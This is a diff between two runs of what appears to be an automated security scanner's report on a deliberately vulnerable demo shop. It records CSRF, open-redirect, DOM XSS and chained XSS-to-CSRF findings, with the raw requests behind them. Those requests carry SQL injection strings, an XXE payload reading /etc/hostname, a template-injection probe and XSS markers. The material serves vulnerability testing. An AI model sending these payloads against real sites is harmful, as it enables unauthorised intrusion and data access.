       connection: keep-alive
-      set-cookie: category=1' OR 1=1--; Secure; HttpOnly
-      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
+      set-cookie: category=1 AND 1=2; Secure; HttpOnly
+      x-backend: eef95d2f-58e1-44cf-ba91-c19bb7e4a3ad
       x-frame-options: SAMEORIGIN
       body[0:200]: <!DOCTYPE html>
 <html>
@@ -1437,49 +1230,55 @@ findings: F-d8bbff4e3e | chain_rule: — | mitigations absent: []
 
   anonymous web session — cookie AWSALB, AWSALBCORS, TrackingId carried by the raw proving requests; provenance not retained in the journal; no Authorization/credential material in any proving request
 
-  - `journal` ref `req-19abd81f` excerpt: `AWSALB=[REDACTED]`
+  - `journal` ref `req-0c61a49c` excerpt: `AWSALB=[REDACTED]`
     REQUEST  POST https://ginandjuice.shop/catalog/cart
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
+      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
       Content-Type: application/x-www-form-urlencoded
       Cookie: AWSALB=[REDACTED]
-      body: productId=4%27+OR+%271%27%3D%271%27+--+&redir=PRODUCT&quantity=1
-    RESPONSE 400
-      date: Sat, 03 Oct 2026 22:25:45 GMT
-      content-type: application/json; charset=utf-8
-      content-length: 30
+      body: productId=1&redir=PRODUCT&quantity=1
+    RESPONSE 200
+      date: Sun, 04 Oct 2026 11:34:13 GMT
+      content-type: text/html; charset=utf-8
+      content-length: 11425
       connection: keep-alive
       set-cookie: AWSALBCORS=[REDACTED]
-      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
+      x-backend: eef95d2f-58e1-44cf-ba91-c19bb7e4a3ad
       x-frame-options: SAMEORIGIN
-      body[0:200]: "Invalid parameter: productId"
-  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-orig`
+      body[0:200]: <!DOCTYPE html>
+<html>
+<!--LAB_HEAD_START-->
+    <head>
+        <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
+        <link href=/resources/css/labsScanme.css rel=stylesheet>
+  
+  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (11424B), cross-orig`
     finding: csrf POST https://ginandjuice.shop/catalog/cart param=productId, redir, quantity status=verified conf=0.85
-      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-origin replay -> HTTP 200 (12658B)
+      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (11424B), cross-origin replay -> HTTP 200 (11424B)
       verification: re-test:fresh-hostile-origin passed=True conf=0.85 rounds=3
 
 **[ENTRY] — verified**
 
   POST https://ginandjuice.shop/catalog/cart — parameter productId, redir, quantity
 
-  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-orig`
+  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (11424B), cross-orig`
     finding: csrf POST https://ginandjuice.shop/catalog/cart param=productId, redir, quantity status=verified conf=0.85
-      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-origin replay -> HTTP 200 (12658B)
+      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (11424B), cross-origin replay -> HTTP 200 (11424B)
       verification: re-test:fresh-hostile-origin passed=True conf=0.85 rounds=3
-  - `journal` ref `req-0064df16` excerpt: `https://ginandjuice.shop/catalog/cart`
+  - `journal` ref `req-026d38e9` excerpt: `https://ginandjuice.shop/catalog/cart`
     REQUEST  POST https://ginandjuice.shop/catalog/cart
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
-      Content-Type: application/xml
+      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
+      Content-Type: application/x-www-form-urlencoded
       Cookie: AWSALB=[REDACTED]
-      body: <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [<!ENTITY sentinelxxe SYSTEM "file:///etc/hostname">]><stockCheck><productId>4</productId><redir>PROD...
+      body: productId=1%27+OR+%271%27%3D%271%27+--+&redir=PRODUCT&quantity=1
     RESPONSE 400
-      date: Sat, 03 Oct 2026 22:26:30 GMT
+      date: Sun, 04 Oct 2026 11:34:02 GMT
       content-type: application/json; charset=utf-8
-      content-length: 31
+      content-length: 30
       connection: keep-alive
       set-cookie: AWSALBCORS=[REDACTED]
-      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
+      x-backend: eef95d2f-58e1-44cf-ba91-c19bb7e4a3ad
       x-frame-options: SAMEORIGIN
-      body[0:200]: "Missing parameter 'productId'"
+      body[0:200]: "Invalid parameter: productId"
 
 **[ACTION] — verified**
 
@@ -1487,31 +1286,31 @@ findings: F-d8bbff4e3e | chain_rule: — | mitigations absent: []
 
   - `finding` ref `F-d8bbff4e3e` excerpt: `verification: re-test:fresh-hostile-origin (passed=True)`
     finding: csrf POST https://ginandjuice.shop/catalog/cart param=productId, redir, quantity status=verified conf=0.85
-      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-origin replay -> HTTP 200 (12658B)
+      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (11424B), cross-origin replay -> HTTP 200 (11424B)
       verification: re-test:fresh-hostile-origin passed=True conf=0.85 rounds=3
-  - `journal` ref `req-0064df16` excerpt: `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [<!ENTITY sentinelxxe SYSTEM "file:///etc/hostname">]><stockC`
+  - `journal` ref `req-026d38e9` excerpt: `productId=1%27+OR+%271%27%3D%271%27+--+&redir=PRODUCT&quantity=1`
     REQUEST  POST https://ginandjuice.shop/catalog/cart
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
-      Content-Type: application/xml
+      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
+      Content-Type: application/x-www-form-urlencoded
       Cookie: AWSALB=[REDACTED]
-      body: <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [<!ENTITY sentinelxxe SYSTEM "file:///etc/hostname">]><stockCheck><productId>4</productId><redir>PROD...
+      body: productId=1%27+OR+%271%27%3D%271%27+--+&redir=PRODUCT&quantity=1
     RESPONSE 400
-      date: Sat, 03 Oct 2026 22:26:30 GMT
+      date: Sun, 04 Oct 2026 11:34:02 GMT
       content-type: application/json; charset=utf-8
-      content-length: 31
+      content-length: 30
       connection: keep-alive
       set-cookie: AWSALBCORS=[REDACTED]
-      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
+      x-backend: eef95d2f-58e1-44cf-ba91-c19bb7e4a3ad
       x-frame-options: SAMEORIGIN
-      body[0:200]: "Missing parameter 'productId'"
+      body[0:200]: "Invalid parameter: productId"
 
 **[OBJECT] — verified**
 
   the state-changing operation (twin entity typing: Order)
 
-  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-orig`
+  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (11424B), cross-orig`
     finding: csrf POST https://ginandjuice.shop/catalog/cart param=productId, redir, quantity status=verified conf=0.85
-      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-origin replay -> HTTP 200 (12658B)
+      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (11424B), cross-origin replay -> HTTP 200 (11424B)
       verification: re-test:fresh-hostile-origin passed=True conf=0.85 rounds=3
   - `twin` ref `stats.digital_twin.entity_inventory` excerpt: `{"carried_by_params": 3, "consumed_by_steps": [], "entity": "Order", "minted_by_steps": [], "surfaces": ["POST /catalog/`
     twin row: {"carried_by_params": 3, "consumed_by_steps": [], "entity": "Order", "minted_by_steps": [], "surfaces": ["POST /catalog/
@@ -1520,34 +1319,34 @@ findings: F-d8bbff4e3e | chain_rule: — | mitigations absent: []
 
   the state-changing operation accepts tokenless cross-origin requests (hostile-origin replay accepted with the scan's own session; no anti-CSRF token, no origin validation)
 
-  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-orig`
+  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (11424B), cross-orig`
     finding: csrf POST https://ginandjuice.shop/catalog/cart param=productId, redir, quantity status=verified conf=0.85
-      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-origin replay -> HTTP 200 (12658B)
+      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (11424B), cross-origin replay -> HTTP 200 (11424B)
       verification: re-test:fresh-hostile-origin passed=True conf=0.85 rounds=3
 
 **[STATE] — verified**
 
   the forged state-changing operation was accepted and processed (hostile-origin replay returned the same success as the baseline)
 
-  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-orig`
+  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (11424B), cross-orig`
     finding: csrf POST https://ginandjuice.shop/catalog/cart param=productId, redir, quantity status=verified conf=0.85
-      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-origin replay -> HTTP 200 (12658B)
+      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (11424B), cross-origin replay -> HTTP 200 (11424B)
       verification: re-test:fresh-hostile-origin passed=True conf=0.85 rounds=3
-  - `journal` ref `req-0064df16` excerpt: `"Missing parameter 'productId'"`
+  - `journal` ref `req-026d38e9` excerpt: `"Invalid parameter: productId"`
     REQUEST  POST https://ginandjuice.shop/catalog/cart
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
-      Content-Type: application/xml
+      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
+      Content-Type: application/x-www-form-urlencoded
       Cookie: AWSALB=[REDACTED]
-      body: <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [<!ENTITY sentinelxxe SYSTEM "file:///etc/hostname">]><stockCheck><productId>4</productId><redir>PROD...
+      body: productId=1%27+OR+%271%27%3D%271%27+--+&redir=PRODUCT&quantity=1
     RESPONSE 400
-      date: Sat, 03 Oct 2026 22:26:30 GMT
+      date: Sun, 04 Oct 2026 11:34:02 GMT
       content-type: application/json; charset=utf-8
-      content-length: 31
+      content-length: 30
       connection: keep-alive
       set-cookie: AWSALBCORS=[REDACTED]
-      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
+      x-backend: eef95d2f-58e1-44cf-ba91-c19bb7e4a3ad
       x-frame-options: SAMEORIGIN
-      body[0:200]: "Missing parameter 'productId'"
+      body[0:200]: "Invalid parameter: productId"
 
 **[IMPACT] — verified**
 
@@ -1555,7 +1354,7 @@ findings: F-d8bbff4e3e | chain_rule: — | mitigations absent: []
 
   - `finding` ref `F-d8bbff4e3e` excerpt: `impact grade=proven; chain: re-test:fresh-hostile-origin on POST https://ginandjuice.shop/catalog/cart`
     finding: csrf POST https://ginandjuice.shop/catalog/cart param=productId, redir, quantity status=verified conf=0.85
-      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-origin replay -> HTTP 200 (12658B)
+      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (11424B), cross-origin replay -> HTTP 200 (11424B)
       verification: re-test:fresh-hostile-origin passed=True conf=0.85 rounds=3
 
 </details>
@@ -1583,17 +1382,17 @@ findings: F-ef23b8b42b | chain_rule: — | mitigations absent: []
 
   anonymous web session — cookie AWSALB, AWSALBCORS, TrackingId carried by the raw proving requests; provenance not retained in the journal; no Authorization/credential material in any proving request
 
-  - `journal` ref `req-25669f7f` excerpt: `AWSALB=[REDACTED]`
-    REQUEST  GET https://ginandjuice.shop/blog/?search=1&back=%3Cb%3Esentinelxssmarkerflt%3C%2Fb%3E
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
+  - `journal` ref `req-1b2041f7` excerpt: `AWSALB=[REDACTED]`
+    REQUEST  GET https://ginandjuice.shop/blog/?search=1&back=1+AND+1%3D2
+      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
       Cookie: AWSALB=[REDACTED]
     RESPONSE 200
-      date: Sat, 03 Oct 2026 22:23:24 GMT
+      date: Sun, 04 Oct 2026 11:32:33 GMT
       content-type: text/html; charset=utf-8
       content-length: 8681
       connection: keep-alive
       set-cookie: AWSALBCORS=[REDACTED]
-      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
+      x-backend: eef95d2f-58e1-44cf-ba91-c19bb7e4a3ad
       x-frame-options: SAMEORIGIN
       body[0:200]: <!DOCTYPE html>
 <html>
@@ -1606,6 +1405,7 @@ findings: F-ef23b8b42b | chain_rule: — | mitigations absent: []
     finding: open_redirect GET https://ginandjuice.shop/blog/ param=search status=verified conf=0.85
       evidence[body_redirect]: off-site URL injected into client redirect sink
       evidence[body_redirect]: off-site URL injected into client redirect sink
+      evidence[body_redirect]: off-site URL injected into client redirect sink
       verification: re-test:second-host passed=True conf=0.85 rounds=1
 
 **[ENTRY] — verified**
@@ -1616,18 +1416,19 @@ findings: F-ef23b8b42b | chain_rule: — | mitigations absent: []
     finding: open_redirect GET https://ginandjuice.shop/blog/ param=search status=verified conf=0.85
       evidence[body_redirect]: off-site URL injected into client redirect sink
       evidence[body_redirect]: off-site URL injected into client redirect sink
+      evidence[body_redirect]: off-site URL injected into client redirect sink
       verification: re-test:second-host passed=True conf=0.85 rounds=1
-  - `journal` ref `req-00501ac7` excerpt: `https://ginandjuice.shop/blog/?search=1+AND+1%3D2&back=%2Fblog%2F`
-    REQUEST  GET https://ginandjuice.shop/blog/?search=1+AND+1%3D2&back=%2Fblog%2F
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
+  - `journal` ref `req-0e44f1cb` excerpt: `https://ginandjuice.shop/blog/?search=1%27+OR+%271%27%3D%271%27+--+`
+    REQUEST  GET https://ginandjuice.shop/blog/?search=1%27+OR+%271%27%3D%271%27+--+
+      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
       Cookie: AWSALB=[REDACTED]
     RESPONSE 200
-      date: Sat, 03 Oct 2026 22:23:12 GMT
+      date: Sun, 04 Oct 2026 11:32:08 GMT
       content-type: text/html; charset=utf-8
-      content-length: 8689
+      content-length: 8722
       connection: keep-alive
       set-cookie: AWSALBCORS=[REDACTED]
-      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
+      x-backend: eef95d2f-58e1-44cf-ba91-c19bb7e4a3ad
       x-frame-options: SAMEORIGIN
       body[0:200]: <!DOCTYPE html>
 <html>
@@ -1645,18 +1446,19 @@ findings: F-ef23b8b42b | chain_rule: — | mitigations absent: []
     finding: open_redirect GET https://ginandjuice.shop/blog/ param=search status=verified conf=0.85
       evidence[body_redirect]: off-site URL injected into client redirect sink
       evidence[body_redirect]: off-site URL injected into client redirect sink
+      evidence[body_redirect]: off-site URL injected into client redirect sink
       verification: re-test:second-host passed=True conf=0.85 rounds=1
-  - `journal` ref `req-00501ac7` excerpt: `https://ginandjuice.shop/blog/?search=1+AND+1%3D2&back=%2Fblog%2F`
-    REQUEST  GET https://ginandjuice.shop/blog/?search=1+AND+1%3D2&back=%2Fblog%2F
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
+  - `journal` ref `req-0e44f1cb` excerpt: `https://ginandjuice.shop/blog/?search=1%27+OR+%271%27%3D%271%27+--+`
+    REQUEST  GET https://ginandjuice.shop/blog/?search=1%27+OR+%271%27%3D%271%27+--+
+      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
       Cookie: AWSALB=[REDACTED]
     RESPONSE 200
-      date: Sat, 03 Oct 2026 22:23:12 GMT
+      date: Sun, 04 Oct 2026 11:32:08 GMT
       content-type: text/html; charset=utf-8
-      content-length: 8689
+      content-length: 8722
       connection: keep-alive
       set-cookie: AWSALBCORS=[REDACTED]
-      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
+      x-backend: eef95d2f-58e1-44cf-ba91-c19bb7e4a3ad
       x-frame-options: SAMEORIGIN
       body[0:200]: <!DOCTYPE html>
 <html>
@@ -1674,23 +1476,24 @@ findings: F-ef23b8b42b | chain_rule: — | mitigations absent: []
     finding: open_redirect GET https://ginandjuice.shop/blog/ param=search status=verified conf=0.85
       evidence[body_redirect]: off-site URL injected into client redirect sink
       evidence[body_redirect]: off-site URL injected into client redirect sink
+      evidence[body_redirect]: off-site URL injected into client redirect sink
       verification: re-test:second-host passed=True conf=0.85 rounds=1
 
 **[AUTHORIZATION] — verified**
 
   the surface is reachable without authentication: raw proving requests carried no Authorization header and were accepted
 
-  - `journal` ref `req-00501ac7` excerpt: `AWSALB=[REDACTED]`
-    REQUEST  GET https://ginandjuice.shop/blog/?search=1+AND+1%3D2&back=%2Fblog%2F
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
+  - `journal` ref `req-0e44f1cb` excerpt: `AWSALB=[REDACTED]`
+    REQUEST  GET https://ginandjuice.shop/blog/?search=1%27+OR+%271%27%3D%271%27+--+
+      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
       Cookie: AWSALB=[REDACTED]
     RESPONSE 200
-      date: Sat, 03 Oct 2026 22:23:12 GMT
+      date: Sun, 04 Oct 2026 11:32:08 GMT
       content-type: text/html; charset=utf-8
-      content-length: 8689
+      content-length: 8722
       connection: keep-alive
       set-cookie: AWSALBCORS=[REDACTED]
-      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
+      x-backend: eef95d2f-58e1-44cf-ba91-c19bb7e4a3ad
       x-frame-options: SAMEORIGIN
       body[0:200]: <!DOCTYPE html>
 <html>
@@ -1703,6 +1506,7 @@ findings: F-ef23b8b42b | chain_rule: — | mitigations absent: []
     finding: open_redirect GET https://ginandjuice.shop/blog/ param=search status=verified conf=0.85
       evidence[body_redirect]: off-site URL injected into client redirect sink
       evidence[body_redirect]: off-site URL injected into client redirect sink
+      evidence[body_redirect]: off-site URL injected into client redirect sink
       verification: re-test:second-host passed=True conf=0.85 rounds=1
 
 **[STATE] — verified**
@@ -1713,6 +1517,7 @@ findings: F-ef23b8b42b | chain_rule: — | mitigations absent: []
     finding: open_redirect GET https://ginandjuice.shop/blog/ param=search status=verified conf=0.85
       evidence[body_redirect]: off-site URL injected into client redirect sink
       evidence[body_redirect]: off-site URL injected into client redirect sink
+      evidence[body_redirect]: off-site URL injected into client redirect sink
       verification: re-test:second-host passed=True conf=0.85 rounds=1
 
 **[IMPACT] — verified**
@@ -1721,6 +1526,7 @@ findings: F-ef23b8b42b | chain_rule: — | mitigations absent: []
 
   - `finding` ref `F-ef23b8b42b` excerpt: `impact grade=proven; chain: re-test:second-host on GET https://ginandjuice.shop/blog/`
     finding: open_redirect GET https://ginandjuice.shop/blog/ param=search status=verified conf=0.85
+      evidence[body_redirect]: off-site URL injected into client redirect sink
       evidence[body_redirect]: off-site URL injected into client redirect sink
       evidence[body_redirect]: off-site URL injected into client redirect sink
       verification: re-test:second-host passed=True conf=0.85 rounds=1
@@ -1735,11 +1541,11 @@ findings: F-fc86abef99, F-d8bbff4e3e | chain_rule: CHAIN-XSS-CSRF | mitigations 
 
 **HOP 1** [VERIFIED] (finding F-fc86abef99) — attacker-delivered script executes in the victim's browser on ginandjuice.shop (xss_dom: execution proven)
   - evidence: finding `F-fc86abef99` — `source=search sink=document.write — payload executed as markup via attr_inject_onload — window.__SENTINEL_XSS_`
-  - evidence: journal `req-25669f7f` — `https://ginandjuice.shop/blog/?search=1&back=%3Cb%3Esentinelxssmarkerflt%3C%2Fb%3E`
+  - evidence: journal `req-0fb351bb` — `https://ginandjuice.shop/blog/?search=1&back=%7B%7B91%2A7%7D%7Dsentinelngmark`
 
 **HOP 2** [VERIFIED] (finding F-d8bbff4e3e) — the executing code drives the state-changing operation POST https://ginandjuice.shop/catalog/cart — which accepts tokenless cross-origin requests
-  - evidence: finding `F-d8bbff4e3e` — `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), `
-  - evidence: journal `req-0064df16` — `https://ginandjuice.shop/catalog/cart`
+  - evidence: finding `F-d8bbff4e3e` — `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (11424B), `
+  - evidence: journal `req-026d38e9` — `https://ginandjuice.shop/catalog/cart`
 
 | Link | Status | Statement |
 |---|---|---|
@@ -1762,9 +1568,9 @@ findings: F-fc86abef99, F-d8bbff4e3e | chain_rule: CHAIN-XSS-CSRF | mitigations 
     finding: xss_dom GET https://ginandjuice.shop/blog/ param=search status=verified conf=0.9
       evidence[dom_execution]: source=search sink=document.write — payload executed as markup via attr_inject_onload — window.__SENTINEL_XSS__ set in live DOM; static flow: function
       verification: re-probe:fresh-canary passed=True conf=0.9 rounds=1
-  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-orig`
+  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (11424B), cross-orig`
     finding: csrf POST https://ginandjuice.shop/catalog/cart param=productId, redir, quantity status=verified conf=0.85
-      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-origin replay -> HTTP 200 (12658B)
+      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (11424B), cross-origin replay -> HTTP 200 (11424B)
       verification: re-test:fresh-hostile-origin passed=True conf=0.85 rounds=3
 
 **[ENTRY] — verified**
@@ -1775,17 +1581,17 @@ findings: F-fc86abef99, F-d8bbff4e3e | chain_rule: CHAIN-XSS-CSRF | mitigations 
     finding: xss_dom GET https://ginandjuice.shop/blog/ param=search status=verified conf=0.9
       evidence[dom_execution]: source=search sink=document.write — payload executed as markup via attr_inject_onload — window.__SENTINEL_XSS__ set in live DOM; static flow: function
       verification: re-probe:fresh-canary passed=True conf=0.9 rounds=1
-  - `journal` ref `req-25669f7f` excerpt: `https://ginandjuice.shop/blog/?search=1&back=%3Cb%3Esentinelxssmarkerflt%3C%2Fb%3E`
-    REQUEST  GET https://ginandjuice.shop/blog/?search=1&back=%3Cb%3Esentinelxssmarkerflt%3C%2Fb%3E
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
+  - `journal` ref `req-0fb351bb` excerpt: `https://ginandjuice.shop/blog/?search=1&back=%7B%7B91%2A7%7D%7Dsentinelngmark`
+    REQUEST  GET https://ginandjuice.shop/blog/?search=1&back=%7B%7B91%2A7%7D%7Dsentinelngmark
+      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
       Cookie: AWSALB=[REDACTED]
     RESPONSE 200
-      date: Sat, 03 Oct 2026 22:23:24 GMT
+      date: Sun, 04 Oct 2026 11:32:41 GMT
       content-type: text/html; charset=utf-8
       content-length: 8681
       connection: keep-alive
       set-cookie: AWSALBCORS=[REDACTED]
-      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
+      x-backend: eef95d2f-58e1-44cf-ba91-c19bb7e4a3ad
       x-frame-options: SAMEORIGIN
       body[0:200]: <!DOCTYPE html>
 <html>
@@ -1803,17 +1609,17 @@ findings: F-fc86abef99, F-d8bbff4e3e | chain_rule: CHAIN-XSS-CSRF | mitigations 
     finding: xss_dom GET https://ginandjuice.shop/blog/ param=search status=verified conf=0.9
       evidence[dom_execution]: source=search sink=document.write — payload executed as markup via attr_inject_onload — window.__SENTINEL_XSS__ set in live DOM; static flow: function
       verification: re-probe:fresh-canary passed=True conf=0.9 rounds=1
-  - `journal` ref `req-25669f7f` excerpt: `https://ginandjuice.shop/blog/?search=1&back=%3Cb%3Esentinelxssmarkerflt%3C%2Fb%3E`
-    REQUEST  GET https://ginandjuice.shop/blog/?search=1&back=%3Cb%3Esentinelxssmarkerflt%3C%2Fb%3E
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
+  - `journal` ref `req-0fb351bb` excerpt: `https://ginandjuice.shop/blog/?search=1&back=%7B%7B91%2A7%7D%7Dsentinelngmark`
+    REQUEST  GET https://ginandjuice.shop/blog/?search=1&back=%7B%7B91%2A7%7D%7Dsentinelngmark
+      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
       Cookie: AWSALB=[REDACTED]
     RESPONSE 200
-      date: Sat, 03 Oct 2026 22:23:24 GMT
+      date: Sun, 04 Oct 2026 11:32:41 GMT
       content-type: text/html; charset=utf-8
       content-length: 8681
       connection: keep-alive
       set-cookie: AWSALBCORS=[REDACTED]
-      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
+      x-backend: eef95d2f-58e1-44cf-ba91-c19bb7e4a3ad
       x-frame-options: SAMEORIGIN
       body[0:200]: <!DOCTYPE html>
 <html>
@@ -1822,33 +1628,33 @@ findings: F-fc86abef99, F-d8bbff4e3e | chain_rule: CHAIN-XSS-CSRF | mitigations 
         <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
         <link href=/resources/css/labsBlog.css rel=stylesheet>
     
-  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-orig`
+  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (11424B), cross-orig`
     finding: csrf POST https://ginandjuice.shop/catalog/cart param=productId, redir, quantity status=verified conf=0.85
-      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-origin replay -> HTTP 200 (12658B)
+      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (11424B), cross-origin replay -> HTTP 200 (11424B)
       verification: re-test:fresh-hostile-origin passed=True conf=0.85 rounds=3
-  - `journal` ref `req-0064df16` excerpt: `https://ginandjuice.shop/catalog/cart`
+  - `journal` ref `req-026d38e9` excerpt: `https://ginandjuice.shop/catalog/cart`
     REQUEST  POST https://ginandjuice.shop/catalog/cart
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
-      Content-Type: application/xml
+      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
+      Content-Type: application/x-www-form-urlencoded
       Cookie: AWSALB=[REDACTED]
-      body: <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [<!ENTITY sentinelxxe SYSTEM "file:///etc/hostname">]><stockCheck><productId>4</productId><redir>PROD...
+      body: productId=1%27+OR+%271%27%3D%271%27+--+&redir=PRODUCT&quantity=1
     RESPONSE 400
-      date: Sat, 03 Oct 2026 22:26:30 GMT
+      date: Sun, 04 Oct 2026 11:34:02 GMT
       content-type: application/json; charset=utf-8
-      content-length: 31
+      content-length: 30
       connection: keep-alive
       set-cookie: AWSALBCORS=[REDACTED]
-      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
+      x-backend: eef95d2f-58e1-44cf-ba91-c19bb7e4a3ad
       x-frame-options: SAMEORIGIN
-      body[0:200]: "Missing parameter 'productId'"
+      body[0:200]: "Invalid parameter: productId"
 
 **[OBJECT] — verified**
 
   the state-changing operation (twin entity typing: Order)
 
-  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-orig`
+  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (11424B), cross-orig`
     finding: csrf POST https://ginandjuice.shop/catalog/cart param=productId, redir, quantity status=verified conf=0.85
-      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-origin replay -> HTTP 200 (12658B)
+      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (11424B), cross-origin replay -> HTTP 200 (11424B)
       verification: re-test:fresh-hostile-origin passed=True conf=0.85 rounds=3
   - `twin` ref `stats.digital_twin.entity_inventory` excerpt: `{"carried_by_params": 3, "consumed_by_steps": [], "entity": "Order", "minted_by_steps": [], "surfaces": ["POST /catalog/`
